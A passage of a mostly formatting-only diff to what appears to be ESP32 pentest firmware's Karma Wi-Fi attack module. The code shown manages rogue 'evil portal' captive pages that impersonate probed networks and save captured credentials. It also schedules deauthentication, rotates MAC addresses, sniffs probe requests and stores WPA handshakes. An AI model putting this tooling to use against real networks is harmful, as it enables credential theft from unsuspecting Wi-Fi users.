         savePortalCredentials(
             portal->ssid,
             "user",
@@ -1387,32 +1424,38 @@ void checkPortals() {
             portal->instance->getApName(),
             portal->portalId
         );
-        
+
         delete portal->instance;
         portal->instance = nullptr;
     }
-    
+
     portal->lastHeartbeat = now;
-    
+
     nextPortalIndex = (nextPortalIndex + 1) % activePortals.size();
     lastPortalHeartbeat = now;
-    
-    activePortals.erase(std::remove_if(activePortals.begin(), activePortals.end(),
-        [now](BackgroundPortal* p) {
-            if (p->markedForRemoval || (now - p->launchTime > PORTAL_MAX_IDLE)) {
-                if (p->instance) delete p->instance;
-                delete p;
-                return true;
+
+    activePortals.erase(
+        std::remove_if(
+            activePortals.begin(),
+            activePortals.end(),
+            [now](BackgroundPortal *p) {
+                if (p->markedForRemoval || (now - p->launchTime > PORTAL_MAX_IDLE)) {
+                    if (p->instance) delete p->instance;
+                    delete p;
+                    return true;
+                }
+                return false;
             }
-            return false;
-        }), activePortals.end());
+        ),
+        activePortals.end()
+    );
 }
 
 // Launch a portal in background mode (no UI)
 void launchBackgroundPortal(const String &ssid, uint8_t channel, const String &templateName) {
     if (activePortals.size() >= MAX_PENDING_PORTALS) return;
-    
-    BackgroundPortal* portal = new BackgroundPortal();
+
+    BackgroundPortal *portal = new BackgroundPortal();
     portal->ssid = ssid;
     portal->channel = channel;
     portal->launchTime = millis();
@@ -1422,12 +1465,16 @@ void launchBackgroundPortal(const String &ssid, uint8_t channel, const String &t
     portal->lastClientActivity = 0;
     portal->markedForRemoval = false;
     portal->portalId = generatePortalId(templateName);
-    
+
     portal->instance = new EvilPortal(ssid, channel, false, false, true, true);
-    
+
     activePortals.push_back(portal);
-    Serial.printf("[PORTAL] Launched background portal %s on ch%d (ID: %s)\n", 
-                  ssid.c_str(), channel, portal->portalId.c_str());
+    Serial.printf(
+        "[PORTAL] Launched background portal %s on ch%d (ID: %s)\n",
+        ssid.c_str(),
+        channel,
+        portal->portalId.c_str()
+    );
 }
 
 void loadPortalTemplates() {
@@ -1494,110 +1541,118 @@ bool selectPortalTemplate(bool isInitialSetup) {
         if (tmpl.isDefault) displayName = "[D] " + displayName;
         if (tmpl.verifyPassword) displayName += " (verify)";
         templateOptions.push_back({displayName.c_str(), [=, &tmpl]() {
-            selectedTemplate = tmpl;
-            templateSelected = true;
-            if (isInitialSetup) {
-                drawMainBorderWithTitle("KARMA SETUP");
-                displayTextLine("Selected: " + tmpl.name);
-                delay(1000);
-            }
-        }});
+                                       selectedTemplate = tmpl;
+                                       templateSelected = true;
+                                       if (isInitialSetup) {
+                                           drawMainBorderWithTitle("KARMA SETUP");
+                                           displayTextLine("Selected: " + tmpl.name);
+                                           delay(1000);
+                                       }
+                                   }});
     }
-    templateOptions.push_back({"Load Custom File", [=]() {
-        drawMainBorderWithTitle("LOAD FROM");
-        std::vector<Option> directOptions;
-        
-        FS *fs = nullptr;
-        if (getFsStorage(fs) && fs == &SD) {
-            directOptions.push_back({"SD Card", [=]() {
-                drawMainBorderWithTitle("BROWSE SD");
-                String templateFile = loopSD(SD, true, "HTML", "/");
-                if (templateFile.length() > 0) {
-                    PortalTemplate customTmpl;
-                    String filename = templateFile.substring(templateFile.lastIndexOf('/') + 1);
-                    customTmpl.name = getDisplayName("/" + filename, true);
-                    customTmpl.filename = templateFile;
-                    customTmpl.isDefault = false;
-                    customTmpl.verifyPassword = false;
-                    File file = SD.open(templateFile, FILE_READ);
-                    if (file) {
-                        String firstLine = file.readStringUntil('\n');
-                        file.close();
-                        if (firstLine.indexOf("verify=\"true\"") != -1) {
-                            customTmpl.verifyPassword = true;
-                        }
-                    }
-                    selectedTemplate = customTmpl;
-                    templateSelected = true;
-                    if (portalTemplates.size() < MAX_PORTAL_TEMPLATES) portalTemplates.push_back(customTmpl);
-                    drawMainBorderWithTitle("SELECTED");
-                    displayTextLine(customTmpl.name);
-                    delay(1500);
-                    if (isInitialSetup) {
-                        drawMainBorderWithTitle("KARMA SETUP");
-                        displayTextLine("Selected: " + customTmpl.name);
-                        delay(1000);
-                    }
-                }
-            }});
-        }
-        
-        directOptions.push_back({"LittleFS", [=]() {
-            drawMainBorderWithTitle("BROWSE LITTLEFS");
-            if (LittleFS.begin()) {
-                String templateFile = loopSD(LittleFS, true, "HTML", "/");
-                if (templateFile.length() > 0) {
-                    PortalTemplate customTmpl;
-                    String filename = templateFile.substring(templateFile.lastIndexOf('/') + 1);
-                    customTmpl.name = getDisplayName("/" + filename, false);
-                    customTmpl.filename = templateFile;
-                    customTmpl.isDefault = false;
-                    customTmpl.verifyPassword = false;
-                    File file = LittleFS.open(templateFile, FILE_READ);
-                    if (file) {
-                        String firstLine = file.readStringUntil('\n');
-                        file.close();
-                        if (firstLine.indexOf("verify=\"true\"") != -1) {
-                            customTmpl.verifyPassword = true;
-                        }
-                    }
-                    selectedTemplate = customTmpl;
-                    templateSelected = true;
-                    if (portalTemplates.size() < MAX_PORTAL_TEMPLATES) portalTemplates.push_back(customTmpl);
-                    drawMainBorderWithTitle("SELECTED");
-                    displayTextLine(customTmpl.name);
-                    delay(1500);
-                    if (isInitialSetup) {
-                        drawMainBorderWithTitle("KARMA SETUP");
-                        displayTextLine("Selected: " + customTmpl.name);
-                        delay(1000);
-                    }
-                }
-                LittleFS.end();
-            } else {
-                displayTextLine("LittleFS error!");
-                delay(1000);
-            }
-        }});
-        
-        directOptions.push_back({"Back", [=]() {}});
-        loopOptions(directOptions);
-        drawMainBorderWithTitle("SELECT TEMPLATE");
-    }});
+    templateOptions.push_back(
+        {"Load Custom File", [=]() {
+             drawMainBorderWithTitle("LOAD FROM");
+             std::vector<Option> directOptions;
+
+             FS *fs = nullptr;
+             if (getFsStorage(fs) && fs == &SD) {
+                 directOptions.push_back(
+                     {"SD Card", [=]() {
+                          drawMainBorderWithTitle("BROWSE SD");
+                          String templateFile = loopSD(SD, true, "HTML", "/");
+                          if (templateFile.length() > 0) {
+                              PortalTemplate customTmpl;
+                              String filename = templateFile.substring(templateFile.lastIndexOf('/') + 1);
+                              customTmpl.name = getDisplayName("/" + filename, true);
+                              customTmpl.filename = templateFile;
+                              customTmpl.isDefault = false;
+                              customTmpl.verifyPassword = false;
+                              File file = SD.open(templateFile, FILE_READ);
+                              if (file) {
+                                  String firstLine = file.readStringUntil('\n');
+                                  file.close();
+                                  if (firstLine.indexOf("verify=\"true\"") != -1) {
+                                      customTmpl.verifyPassword = true;
+                                  }
+                              }
+                              selectedTemplate = customTmpl;
+                              templateSelected = true;
+                              if (portalTemplates.size() < MAX_PORTAL_TEMPLATES)
+                                  portalTemplates.push_back(customTmpl);
+                              drawMainBorderWithTitle("SELECTED");
+                              displayTextLine(customTmpl.name);
+                              delay(1500);
+                              if (isInitialSetup) {
+                                  drawMainBorderWithTitle("KARMA SETUP");
+                                  displayTextLine("Selected: " + customTmpl.name);
+                                  delay(1000);
+                              }
+                          }
+                      }}
+                 );
+             }
+
+             directOptions.push_back(
+                 {"LittleFS", [=]() {
+                      drawMainBorderWithTitle("BROWSE LITTLEFS");
+                      if (LittleFS.begin()) {
+                          String templateFile = loopSD(LittleFS, true, "HTML", "/");
+                          if (templateFile.length() > 0) {
+                              PortalTemplate customTmpl;
+                              String filename = templateFile.substring(templateFile.lastIndexOf('/') + 1);
+                              customTmpl.name = getDisplayName("/" + filename, false);
+                              customTmpl.filename = templateFile;
+                              customTmpl.isDefault = false;
+                              customTmpl.verifyPassword = false;
+                              File file = LittleFS.open(templateFile, FILE_READ);
+                              if (file) {
+                                  String firstLine = file.readStringUntil('\n');
+                                  file.close();
+                                  if (firstLine.indexOf("verify=\"true\"") != -1) {
+                                      customTmpl.verifyPassword = true;
+                                  }
+                              }
+                              selectedTemplate = customTmpl;
+                              templateSelected = true;
+                              if (portalTemplates.size() < MAX_PORTAL_TEMPLATES)
+                                  portalTemplates.push_back(customTmpl);
+                              drawMainBorderWithTitle("SELECTED");
+                              displayTextLine(customTmpl.name);
+                              delay(1500);
+                              if (isInitialSetup) {
+                                  drawMainBorderWithTitle("KARMA SETUP");
+                                  displayTextLine("Selected: " + customTmpl.name);
+                                  delay(1000);
+                              }
+                          }
+                          LittleFS.end();
+                      } else {
+                          displayTextLine("LittleFS error!");
+                          delay(1000);
+                      }
+                  }}
+             );
+
+             directOptions.push_back({"Back", [=]() {}});
+             loopOptions(directOptions);
+             drawMainBorderWithTitle("SELECT TEMPLATE");
+         }}
+    );
     templateOptions.push_back({"Disable Auto-Portal", [=]() {
-        karmaConfig.enableAutoPortal = false;
-        templateSelected = false;
-        if (isInitialSetup) {
-            drawMainBorderWithTitle("KARMA SETUP");
-            displayTextLine("Auto-portal disabled");
-            delay(1000);
-        }
-    }});
+                                   karmaConfig.enableAutoPortal = false;
+                                   templateSelected = false;
+                                   if (isInitialSetup) {
+                                       drawMainBorderWithTitle("KARMA SETUP");
+                                       displayTextLine("Auto-portal disabled");
+                                       delay(1000);
+                                   }
+                               }});
     templateOptions.push_back({"Reload Templates", [=]() {
-        loadPortalTemplates();
-        displayTextLine("Templates reloaded");
-        delay(1000);
-    }});
+                                   loadPortalTemplates();
+                                   displayTextLine("Templates reloaded");
+                                   delay(1000);
+                               }});
     loopOptions(templateOptions);
     return templateSelected;
 }
@@ -1628,10 +1683,10 @@ void launchTieredEvilPortal(PendingPortal &portal) {
 
     Serial.printf("[TIER-%d] Launching background portal for %s\n", portal.tier, portal.ssid.c_str());
     launchBackgroundPortal(portal.ssid, portal.channel, portal.templateName);
-    
+
     activePortalChannel = 0;
     auto_hopping = true;
-    
+
     if (portal.isCloneAttack) cloneAttacksLaunched++;
     else autoPortalsLaunched++;
     screenNeedsRedraw = true;
@@ -1639,14 +1694,15 @@ void launchTieredEvilPortal(PendingPortal &portal) {
 
 void executeTieredAttackStrategy() {
     if (pendingPortals.empty() || !templateSelected || isPortalActive || karmaPaused) return;
-    std::sort(pendingPortals.begin(), pendingPortals.end(),
-        [](const PendingPortal &a, const PendingPortal &b) {
+    std::sort(
+        pendingPortals.begin(), pendingPortals.end(), [](const PendingPortal &a, const PendingPortal &b) {
             if (a.isCloneAttack && !b.isCloneAttack) return true;
             if (!a.isCloneAttack && b.isCloneAttack) return false;
             return a.priority > b.priority;
-        });
+        }
+    );
     if (attackConfig.enableTieredAttack) {
-        for (auto it = pendingPortals.begin(); it != pendingPortals.end(); ) {
+        for (auto it = pendingPortals.begin(); it != pendingPortals.end();) {
             if (it->isCloneAttack && !it->launched) {
                 launchTieredEvilPortal(*it);
                 it->launched = true;
@@ -1654,7 +1710,7 @@ void executeTieredAttackStrategy() {
                 return;
             } else ++it;
         }
-        for (auto it = pendingPortals.begin(); it != pendingPortals.end(); ) {
+        for (auto it = pendingPortals.begin(); it != pendingPortals.end();) {
             if (it->tier == TIER_HIGH && !it->launched) {
                 launchTieredEvilPortal(*it);
                 it->launched = true;
@@ -1681,7 +1737,7 @@ void executeTieredAttackStrategy() {
                 }
             }
         }
-        for (auto it = pendingPortals.begin(); it != pendingPortals.end(); ) {
+        for (auto it = pendingPortals.begin(); it != pendingPortals.end();) {
             if (it->tier == TIER_FAST && !it->launched) {
                 launchTieredEvilPortal(*it);
                 it->launched = true;
@@ -1690,7 +1746,7 @@ void executeTieredAttackStrategy() {
             } else ++it;
         }
     } else {
-        for (auto it = pendingPortals.begin(); it != pendingPortals.end(); ) {
+        for (auto it = pendingPortals.begin(); it != pendingPortals.end();) {
             if (!it->launched) {
                 launchTieredEvilPortal(*it);
                 it->launched = true;
@@ -1704,9 +1760,14 @@ void executeTieredAttackStrategy() {
 void checkPendingPortals() {
     if (pendingPortals.empty() || !templateSelected || isPortalActive || karmaPaused) return;
     unsigned long now = millis();
-    pendingPortals.erase(std::remove_if(pendingPortals.begin(), pendingPortals.end(),
-        [now](const PendingPortal &p) { return (now - p.timestamp > 300000); }),
-        pendingPortals.end());
+    pendingPortals.erase(
+        std::remove_if(
+            pendingPortals.begin(),
+            pendingPortals.end(),
+            [now](const PendingPortal &p) { return (now - p.timestamp > 300000); }
+        ),
+        pendingPortals.end()
+    );
     executeTieredAttackStrategy();
 }
 
@@ -1715,17 +1776,17 @@ void launchManualEvilPortal(const String &ssid, uint8_t channel, bool verifyPwd)
     launchBackgroundPortal(ssid, channel, selectedTemplate.name);
 }
 
-void handleBroadcastResponse(const String& ssid, const String& mac) {
+void handleBroadcastResponse(const String &ssid, const String &mac) {
     if (broadcastAttack.isActive() && !karmaPaused) {
         broadcastAttack.processProbeResponse(ssid, mac);
-        
+
         uint32_t fingerprint = 0;
         for (int i = 0; i < mac.length(); i++) {
             fingerprint = ((fingerprint << 5) + fingerprint) + mac.charAt(i);
         }
-        
+
         if (clientBehaviors.size() >= MAX_CLIENT_TRACK) return;
-        
+
         auto it = clientBehaviors.find(fingerprint);
         if (it == clientBehaviors.end()) {
             ClientBehavior behavior;
@@ -1741,7 +1802,7 @@ void handleBroadcastResponse(const String& ssid, const String& mac) {
             behavior.isVulnerable = true;
             clientBehaviors[fingerprint] = behavior;
             uniqueClients++;
-            
+
             if (karmaConfig.enableAutoKarma && pendingPortals.size() < MAX_PENDING_PORTALS) {
                 PendingPortal portal;
                 portal.ssid = ssid;
@@ -1781,13 +1842,13 @@ void saveProbesToPCAP(FS &fs) {
     uint32_t snaplen = 65535;
     uint32_t network = 105;
 
-    file.write((uint8_t*)&magic, 4);
-    file.write((uint8_t*)&version_major, 2);
-    file.write((uint8_t*)&version_minor, 2);
-    file.write((uint8_t*)&thiszone, 4);
-    file.write((uint8_t*)&sigfigs, 4);
-    file.write((uint8_t*)&snaplen, 4);
-    file.write((uint8_t*)&network, 4);
+    file.write((uint8_t *)&magic, 4);
+    file.write((uint8_t *)&version_major, 2);
+    file.write((uint8_t *)&version_minor, 2);
+    file.write((uint8_t *)&thiszone, 4);
+    file.write((uint8_t *)&sigfigs, 4);
+    file.write((uint8_t *)&snaplen, 4);
+    file.write((uint8_t *)&network, 4);
 
     int written = 0;
     for (int i = 0; i < MAX_PROBE_BUFFER && written < 50; i++) {
@@ -1799,10 +1860,10 @@ void saveProbesToPCAP(FS &fs) {
         uint32_t ts_sec = probe.timestamp / 1000;
         uint32_t ts_usec = (probe.timestamp % 1000) * 1000;
 
-        file.write((uint8_t*)&ts_sec, 4);
-        file.write((uint8_t*)&ts_usec, 4);
-        file.write((uint8_t*)&probe.frame_len, 4);
-        file.write((uint8_t*)&probe.frame_len, 4);
+        file.write((uint8_t *)&ts_sec, 4);
+        file.write((uint8_t *)&ts_usec, 4);
+        file.write((uint8_t *)&probe.frame_len, 4);
+        file.write((uint8_t *)&probe.frame_len, 4);
         file.write(probe.frame, probe.frame_len);
         written++;
     }
@@ -1822,29 +1883,35 @@ void saveProbesToPCAP(FS &fs) {
 void saveHandshakeToFile(const HandshakeCapture &hs) {
     FS *fs = nullptr;
     if (!getFsStorage(fs)) return;
-    
-    if (!fs->exists("/BrucePCAP/handshakes")) {
-        fs->mkdir("/BrucePCAP/handshakes");
-    }
-    
+
+    if (!fs->exists("/BrucePCAP/handshakes")) { fs->mkdir("/BrucePCAP/handshakes"); }
+
     char macStr[18];
-    snprintf(macStr, sizeof(macStr), "%02X%02X%02X%02X%02X%02X",
-             hs.bssid[0], hs.bssid[1], hs.bssid[2],
-             hs.bssid[3], hs.bssid[4], hs.bssid[5]);
-    
+    snprintf(
+        macStr,
+        sizeof(macStr),
+        "%02X%02X%02X%02X%02X%02X",
+        hs.bssid[0],
+        hs.bssid[1],
+        hs.bssid[2],
+        hs.bssid[3],
+        hs.bssid[4],
+        hs.bssid[5]
+    );
+
     String filename = "/BrucePCAP/handshakes/HS_" + String(macStr) + "_" + hs.ssid + ".pcap";
     filename.replace(" ", "_");
     filename.replace("*", "");
-    
+
     File file = fs->open(filename, FILE_APPEND);
     if (file) {
         uint32_t ts_sec = hs.timestamp / 1000;
         uint32_t ts_usec = (hs.timestamp % 1000) * 1000;
-        file.write((uint8_t*)&ts_sec, 4);
-        file.write((uint8_t*)&ts_usec, 4);
+        file.write((uint8_t *)&ts_sec, 4);
+        file.write((uint8_t *)&ts_usec, 4);
         uint32_t len = hs.frameLen;
-        file.write((uint8_t*)&len, 4);
-        file.write((uint8_t*)&len, 4);
+        file.write((uint8_t *)&len, 4);
+        file.write((uint8_t *)&len, 4);
         file.write(hs.eapolFrame, hs.frameLen);
         file.close();
     }
@@ -1893,7 +1960,7 @@ void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
     if (mac.isEmpty()) return;
 
     uint32_t fingerprint = generateClientFingerprint(frame, pkt->rx_ctrl.sig_len);
-    
+
     String cacheKey = mac + ":" + String(fingerprint);
     if (isMACInCache(cacheKey)) return;
     addMACToCache(cacheKey);
@@ -1935,8 +2002,8 @@ void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
     }
 
     bool isRandomizedMAC = false;
-    if (mac.startsWith("12:") || mac.startsWith("22:") || 
-        mac.startsWith("32:") || mac.startsWith("42:")) isRandomizedMAC = true;
+    if (mac.startsWith("12:") || mac.startsWith("22:") || mac.startsWith("32:") || mac.startsWith("42:"))
+        isRandomizedMAC = true;
     static uint32_t fakeMACCounter = 0;
     if (isRandomizedMAC) {
         fakeMACCounter++;
@@ -2003,23 +2070,21 @@ void clearProbes() {
     assocBlocked = 0;
     handshakeBuffer.clear();
     memset(channelActivity, 0, sizeof(channelActivity));
-    
+
     clientBehaviors.clear();
-    
+
     for (auto portal : activePortals) {
         if (portal->instance) delete portal->instance;
         delete portal;
     }
     activePortals.clear();
-    
+
     while (!responseQueue.empty()) responseQueue.pop();
     if (macRingBuffer) {
         vRingbufferDelete(macRingBuffer);
         initMACCache();
     }
-    for (int i = 0; i < MAX_PROBE_BUFFER; i++) {
-        probeBuffer[i].frame_len = 0;
-    }
+    for (int i = 0; i < MAX_PROBE_BUFFER; i++) { probeBuffer[i].frame_len = 0; }
 }
 
 std::vector<ProbeRequest> getUniqueProbes() {
@@ -2058,13 +2123,13 @@ void updateKarmaDisplay() {
     unsigned long currentTime = millis();
     if (currentTime - last_time > 1000) {
         last_time = currentTime;
-        
+
         tft.fillRect(10, 45, tftWidth - 20, tftHeight - 70, bruceConfig.bgColor);
         tft.setTextSize(1);
         tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-        
+
         int y = 50;
-        
+
         if (karmaPaused) {
             tft.setTextColor(TFT_RED, bruceConfig.bgColor);
             tft.setCursor(10, y);
@@ -2072,7 +2137,7 @@ void updateKarmaDisplay() {
             tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
             y += 15;
         }
-        
+
         tft.setCursor(10, y);
         tft.print("Total:" + String(totalProbes));
         tft.setCursor(70, y);
@@ -2082,7 +2147,7 @@ void updateKarmaDisplay() {
         tft.setCursor(190, y);
         tft.print("Pend:" + String(pendingPortals.size()));
         y += 15;
-        
+
         tft.setCursor(10, y);
         tft.print("Queue:" + String(responseQueue.size()));
         tft.setCursor(70, y);
@@ -2092,7 +2157,7 @@ void updateKarmaDisplay() {
         tft.setCursor(190, y);
         tft.print("Clone:" + String(cloneAttacksLaunched));
         y += 15;
-        
+
         tft.setCursor(10, y);
         tft.print("Port:" + String(autoPortalsLaunched) + "/" + String(activePortals.size()));
         tft.setCursor(100, y);
@@ -2100,23 +2165,31 @@ void updateKarmaDisplay() {
         tft.setCursor(160, y);
         tft.print("PMKID:" + String(pmkidCaptured));
         y += 15;
-        
+
         tft.setCursor(10, y);
         tft.print("Ch:" + String(pgm_read_byte(&karma_channels[channl % 14])));
         tft.setCursor(70, y);
         String hopStatus = String(auto_hopping ? "Auto:" : "Man:") + String(hop_interval) + "ms";
         tft.print(hopStatus);
         y += 15;
-        
+
         tft.setCursor(10, y);
         char macStr[18];
-        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
-                 currentBSSID[0], currentBSSID[1], currentBSSID[2],
-                 currentBSSID[3], currentBSSID[4], currentBSSID[5]);
+        snprintf(
+            macStr,
+            sizeof(macStr),
+            "%02X:%02X:%02X:%02X:%02X:%02X",
+            currentBSSID[0],
+            currentBSSID[1],
+            currentBSSID[2],
+            currentBSSID[3],
+            currentBSSID[4],
+            currentBSSID[5]
+        );
         tft.print("MAC:" + String(macStr));
-        
+
         String modeText = "";
-        switch(karmaMode) {
+        switch (karmaMode) {
             case MODE_PASSIVE: modeText = "PASSIVE"; break;
             case MODE_BROADCAST: modeText = "BROADCAST"; break;
             case MODE_FULL: modeText = "FULL"; break;
@@ -2125,7 +2198,7 @@ void updateKarmaDisplay() {
         tft.setCursor(tftWidth - 10 - (modeText.length() * 6), y);
         tft.print(modeText);
         y += 15;
-        
+
         if (templateSelected && !selectedTemplate.name.isEmpty()) {
             tft.setCursor(10, y);
             String templateText = "Template:" + selectedTemplate.name;
@@ -2133,7 +2206,7 @@ void updateKarmaDisplay() {
             tft.print(templateText);
             y += 15;
         }
-        
+
         if (broadcastAttack.isActive()) {
             tft.setCursor(10, y);
             tft.print("Broadcast:" + broadcastAttack.getProgressString());
@@ -2141,7 +2214,7 @@ void updateKarmaDisplay() {
         } else {
             y += 15;
         }
-        
+
         tft.setCursor(10, tftHeight - 15);
         tft.print("SEL/ESC:Menu | Prev/Next:Channel");
     }
@@ -2156,9 +2229,13 @@ void saveNetworkHistory(FS &fs) {
         file.println("SSID,ResponsesSent,SuccessfulConnections,LastResponse");
         size_t count = 0;
         for (const auto &history : networkHistory) {
-            file.printf("\"%s\",%lu,%lu,%lu\n", history.first.c_str(),
-                       history.second.responsesSent, history.second.successfulConnections,
-                       history.second.lastResponse);
+            file.printf(
+                "\"%s\",%lu,%lu,%lu\n",
+                history.first.c_str(),
+                history.second.responsesSent,
+                history.second.successfulConnections,
+                history.second.lastResponse
+            );
             if (++count >= 20) break;
         }
         file.close();
@@ -2177,10 +2254,10 @@ void karma_setup() {
     }
     esp_wifi_set_promiscuous_rx_cb(nullptr);
     esp_wifi_set_promiscuous(false);
-    
+
     // Force full screen clear on entry
     forceFullRedraw();
-    
+
     returnToMenu = false;
     isPortalActive = false;
     restartKarmaAfterPortal = false;
@@ -2192,9 +2269,7 @@ void karma_setup() {
     pmkidCaptured = 0;
     assocBlocked = 0;
 
-    for (int i = 0; i < MAX_PROBE_BUFFER; i++) {
-        probeBuffer[i].frame_len = 0;
-    }
+    for (int i = 0; i < MAX_PROBE_BUFFER; i++) { probeBuffer[i].frame_len = 0; }
 
     if (macRingBuffer) vRingbufferDelete(macRingBuffer);
     initMACCache();
@@ -2206,13 +2281,13 @@ void karma_setup() {
     networkHistory.clear();
     macBlacklist.clear();
     handshakeBuffer.clear();
-    
+
     for (auto portal : activePortals) {
         if (portal->instance) delete portal->instance;
         delete portal;
     }
     activePortals.clear();
-    
+
     while (!responseQueue.empty()) responseQueue.pop();
     generateRandomBSSID(currentBSSID);
     lastMACRotation = millis();
@@ -2245,7 +2320,7 @@ void karma_setup() {
         storageAvailable = checkLittleFsSizeNM();
     }
     if (storageAvailable && !Fs->exists("/ProbeData")) Fs->mkdir("/ProbeData");
-    
+
     // Force another full clear before showing main screen
     forceFullRedraw();
     drawMainBorderWithTitle("ENHANCED KARMA ATK");
@@ -2253,7 +2328,7 @@ void karma_setup() {
     tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
     padprintln("Saved to " + FileSys);
     padprintln("Modern Karma Started");
-    
+
     clearProbes();
 
     karmaQueue = xQueueCreate(KARMA_QUEUE_DEPTH, sizeof(ProbeRequest));
@@ -2281,7 +2356,7 @@ void karma_setup() {
 
     ensureWifiPlatform();
 
-    wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
+    wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT};
     esp_wifi_set_promiscuous_filter(&filter);
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_promiscuous_rx_cb(probe_sniffer);
@@ -2304,7 +2379,7 @@ void karma_setup() {
         if (returnToMenu) {
             esp_wifi_set_promiscuous(false);
             esp_wifi_set_promiscuous_rx_cb(nullptr);
-            
+
             for (auto portal : activePortals) {
                 if (portal->instance) {
                     delete portal->instance;
@@ -2313,7 +2388,7 @@ void karma_setup() {
                 delete portal;
             }
             activePortals.clear();
-            
+
             while (!responseQueue.empty()) responseQueue.pop();
             if (macRingBuffer) {
                 vRingbufferDelete(macRingBuffer);
@@ -2323,14 +2398,12 @@ void karma_setup() {
                 vQueueDelete(karmaQueue);
                 karmaQueue = nullptr;
             }
-            
+
             vTaskDelay(50 / portTICK_PERIOD_MS);
             return;
         }
         unsigned long currentTime = millis();
-        if (is_LittleFS) {
-            storageAvailable = checkLittleFsSizeNM();
-        }
+        if (is_LittleFS) { storageAvailable = checkLittleFsSizeNM(); }
         rotateBSSID();
         if (karmaConfig.enableSmartHop && !karmaPaused) smartChannelHop();
         if (karmaConfig.enableDeauth && (currentTime - lastDeauthTime > DEAUTH_INTERVAL) && !karmaPaused) {
@@ -2345,10 +2418,11 @@ void karma_setup() {
             checkForAssociations();
             checkPortals();
         }
-        if (broadcastAttack.isActive() && (karmaMode == MODE_BROADCAST || karmaMode == MODE_FULL) && !karmaPaused) {
+        if (broadcastAttack.isActive() && (karmaMode == MODE_BROADCAST || karmaMode == MODE_FULL) &&
+            !karmaPaused) {
             broadcastAttack.update();
         }
-        
+
         if (check(NextPress)) {
             if (!karmaPaused) esp_wifi_set_promiscuous(false);
             channl++;
@@ -2360,7 +2434,7 @@ void karma_setup() {
                 esp_wifi_set_promiscuous(true);
             }
         }
-        
+
         if (check(PrevPress)) {
             if (!karmaPaused) esp_wifi_set_promiscuous(false);
             if (channl == 0) channl = 13;
@@ -2372,459 +2446,577 @@ void karma_setup() {
                 esp_wifi_set_promiscuous(true);
             }
         }
-        
+
         if (check(SelPress) || check(EscPress)) {
             check(SelPress);
             check(EscPress);
-            
-            vTaskDelay(200 / portTICK_PERIOD_MS);
-            
-            std::vector<Option> options = {
-                {"Enhanced Stats", [&]() {
-                    drawMainBorderWithTitle("ADVANCED STATS");
-                    int y = 40;
-                    tft.setTextSize(1);
-                    tft.setCursor(10, y); y += 15;
-                    tft.print("Total: " + String(totalProbes));
-                    tft.setCursor(10, y); y += 15;
-                    tft.print("Unique: " + String(uniqueClients));
-                    tft.setCursor(10, y); y += 15;
-                    tft.print("Karma: " + String(karmaResponsesSent));
-                    tft.setCursor(10, y); y += 15;
-                    tft.print("Beacons: " + String(beaconsSent));
-                    tft.setCursor(10, y); y += 15;
-                    tft.print("Active: " + String(activeNetworks.size()));
-                    tft.setCursor(10, y); y += 15;
-                    tft.print("Pending: " + String(pendingPortals.size()));
-                    tft.setCursor(10, y); y += 15;
-                    tft.print("Portals: " + String(activePortals.size()));
-                    tft.setCursor(10, y); y += 15;
-                    tft.print("Blacklist: " + String(macBlacklist.size()));
-                    tft.setCursor(10, y); y += 15;
-                    tft.print("PMKID: " + String(pmkidCaptured));
-                    tft.setCursor(10, y); y += 15;
-                    tft.print("Handshakes: " + String(handshakeBuffer.size()));
-                    tft.setCursor(10, tftHeight - 20);
-                    tft.print("Sel: Back");
-                    while (!check(SelPress) && !check(EscPress)) {
-                        if (check(PrevPress)) break;
-                        delay(50);
-                    }
-                    screenNeedsRedraw = true;
-                }},
-                
-                {karmaPaused ? "Resume Karma" : "Pause Karma", [&]() {
-                    karmaPaused = !karmaPaused;
-                    if (karmaPaused) {
-                        esp_wifi_set_promiscuous(false);
-                        displayTextLine("Karma PAUSED");
-                    } else {
-                        esp_wifi_set_promiscuous(true);
-                        displayTextLine("Karma RESUMED");
-                    }
-                    delay(1000);
-                    screenNeedsRedraw = true;
-                }},
-                
-                {"Rotate MAC Now", [&]() {
-                    generateRandomBSSID(currentBSSID);
-                    lastMACRotation = millis();
-                    displayTextLine("MAC rotated");
-                    delay(1000);
-                    screenNeedsRedraw = true;
-                }},
-                
-                {"Set Mode", [&]() {
-                    std::vector<Option> modeOptions = {
-                        {"Passive (Listen only)", [&]() {
-                            karmaMode = MODE_PASSIVE;
-                            broadcastAttack.stop();
-                            attackConfig.enableBeaconing = false;
-                            displayTextLine("Passive mode");
-                            delay(1000);
-                        }},
-                        {"Broadcast (Advertise SSIDs)", [&]() {
-                            karmaMode = MODE_BROADCAST;
-                            if (!karmaPaused) {
-                                broadcastAttack.start();
-                                attackConfig.enableBeaconing = true;
-                            }
-                            displayTextLine("Broadcast mode");
-                            delay(1000);
-                        }},
-                        {"Full (Both)", [&]() {
-                            karmaMode = MODE_FULL;
-                            if (!karmaPaused) {
-                                broadcastAttack.start();
-                                attackConfig.enableBeaconing = true;
-                            }
-                            displayTextLine("Full mode");
-                            delay(1000);
-                        }},
-                        {"Back", [&]() {}}
-                    };
-                    loopOptions(modeOptions);
-                    screenNeedsRedraw = true;
-                }},
-                
-                {"Channel Control", [&]() {
-                    std::vector<Option> channelOptions = {
-                        {"Next Channel", [&]() {
-                            if (!karmaPaused) esp_wifi_set_promiscuous(false);
-                            channl++;
-                            if (channl >= 14) channl = 0;
-                            setChannelWithSecond(pgm_read_byte(&karma_channels[channl % 14]));
-                            screenNeedsRedraw = true;
-                            if (!karmaPaused) esp_wifi_set_promiscuous(true);
-                            displayTextLine("Channel: " + String(karma_channels[channl % 14]));
-                            delay(1000);
-                        }},
-                        {"Previous Channel", [&]() {
-                            if (!karmaPaused) esp_wifi_set_promiscuous(false);
-                            if (channl == 0) channl = 13;
-                            else channl--;
-                            setChannelWithSecond(pgm_read_byte(&karma_channels[channl % 14]));
-                            screenNeedsRedraw = true;
-                            if (!karmaPaused) esp_wifi_set_promiscuous(true);
-                            displayTextLine("Channel: " + String(karma_channels[channl % 14]));
-                            delay(1000);
-                        }},
-                        {"Auto Hop ON/OFF", [&]() {
